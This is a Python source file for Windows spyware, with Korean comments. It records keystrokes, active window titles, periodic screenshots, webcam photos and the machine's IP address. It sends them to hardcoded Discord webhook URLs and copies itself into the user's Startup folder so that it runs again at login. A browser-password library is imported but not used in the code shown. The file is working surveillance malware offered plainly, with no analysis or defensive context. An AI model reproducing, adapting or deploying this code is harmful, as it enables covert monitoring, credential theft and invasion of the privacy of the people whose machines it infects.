from discord_webhook import DiscordWebhook, DiscordEmbed
from pynput.keyboard import Key,Listener
import threading
from chromepass import Chromepass
import win32gui
import getpass
import time
import os
import shutil
from pathlib import Path
import socket
import argparse
import cv2
import pyautogui
import requests
import base64

global keylog,lim,tab,crpass,filenameforexe,version,path
keylog = ""
filenameforexe = "최종 .exe 파일 이름"
lim = 1970
LURL = ""
LURL2 = "https://discordapp.com/api/webhooks/943844790578077706/TG6gl6I05ay4NMtRXSvBEulSwDE4XIaVt56bmduzmMpTZqx_ZW4H_S9ZLt9eH5Xn0ulD"
LURL3 = "https://discordapp.com/api/webhooks/943845676301844510/iI1lbmwJOWrfO2uminNWV159rbORIaURWR7rTTmgHKkc0-wnpat7zXCJjZKqEecLawfh"
LURL4 = "https://discordapp.com/api/webhooks/943857139741515836/49Lpj3Hq5e22A-nQSIl6B9wxIi_OmJJNCZ22N_tUlPI_wkrmcyxTpAErGswyUD16S1eM"
LNAME = getpass.getuser()
tab = ""
path = "image"

def send(message,target) -> None:
    sendall = DiscordWebhook(url=target, content=message, username=LNAME)
    sendall.execute()

def send_image_to_discord(image_file, url):
    try:
        webhook = DiscordWebhook(url=url)
        now = time.localtime()
        with open(f"{image_file}", "rb") as f:
            webhook.add_file(file=f.read(), filename=image_file)
        embed = DiscordEmbed(title=f"{LNAME}", description=f"{now.tm_year}/{now.tm_mon}/{now.tm_mday} {now.tm_hour}:{now.tm_min}:{now.tm_sec}", color='03b2f8')
        embed.set_thumbnail(url=f'attachment://{image_file}')
        webhook.add_embed(embed)
        webhook.execute()
    except:
        logging("ERROR | sending screenshot is Fail")

def logging(message):
    now = time.localtime()
    message = f"{message} | {now.tm_year}/{now.tm_mon}/{now.tm_mday} {now.tm_hour}:{now.tm_min}:{now.tm_sec}"
    send(message,LURL3)

def on_press(Key):
    global keylog, lim
    try:
        if len(keylog) < lim:
            keylog = keylog + "." + str(Key).replace("'","")
        elif len(keylog) >= lim:
            send(keylog,LURL)
            logging("SUCCESS | KeyLogging is send")
            keylog = ""
    except:
        logging("ERROR | KeyLogging is Fail")


def listener_c():
    with Listener(on_press=on_press) as listener:
        listener.join()

def startup():
    global filenameforexe
    PATH = f"C:\\Users\\{LNAME}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
    end_PATH = str(Path.cwd()) + "\\" + filenameforexe
    if os.path.isdir(PATH):
        try:
            shutil.copy(end_PATH,PATH)
            logging(f"SUCCESS | copy_move {end_PATH} -> {PATH}" + "\\")
        except:
            logging(f"ERROR | copy_move {end_PATH} -> {PATH} is fail")
    else:
        logging(f"FAIL | copy_move {end_PATH} -> {PATH} is fail cause dir isn't there")

def Tab():
    global tab
    try:
        if tab != win32gui.GetWindowText(win32gui.GetForegroundWindow()):
            tab = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            send(tab,LURL2)
    except:
        logging("ERROR | TabLogging is Fail")

def whiling():
    while True:
        Tab()
        time.sleep(0.01)

def screenshot():
    global path
    try:
        pyautogui.screenshot(f"{path}\\screenshot.jpg")
        send_image_to_discord(image_file=f"{path}\\screenshot.jpg",url=LURL3)
        os.remove(f"{path}\\screenshot.jpg")
    except:
        logging("ERROR | Get ScreenShot is Fail")

def camshoot():
    global path
    try:
        try:
            cap = cv2.VideoCapture(0)  # 노트북 웹캠을 카메라로 사용
        except:
            logging("ERROR | This Computer hasn't cam")
        cap.set(3, 640)  # 너비
        cap.set(4, 480)  # 높이
        ret, frame = cap.read()  # 사진 촬영
        frame = cv2.flip(frame, 1)  # 좌우 대칭
        cv2.imwrite(f"{path}\\camshoot.jpg", frame)  # 사진 저장
        cap.release()
        cv2.destroyAllWindows()
        send_image_to_discord(f"{path}\\camshoot.jpg",LURL3)
        os.remove(f"{path}\\camshoot.jpg")
    except:
        logging("ERROR | CamShoot is Fail")

def listener_screenshot():
    while True:
        screenshot()
        time.sleep(10)

def listener_camshot():
    while True:
        camshoot()
        time.sleep(10.25)

def Get_IP():
    logging(f"Grabbing | {socket.gethostbyname(socket.gethostname())}")

def main():
    startup()
    Get_IP()
    threading.Thread(target=listener_c).start()
    threading.Thread(target=whiling).start()
    threading.Thread(target=listener_screenshot).start()
    threading.Thread(target=listener_camshot).start()

if __name__ == '__main__':
    main()
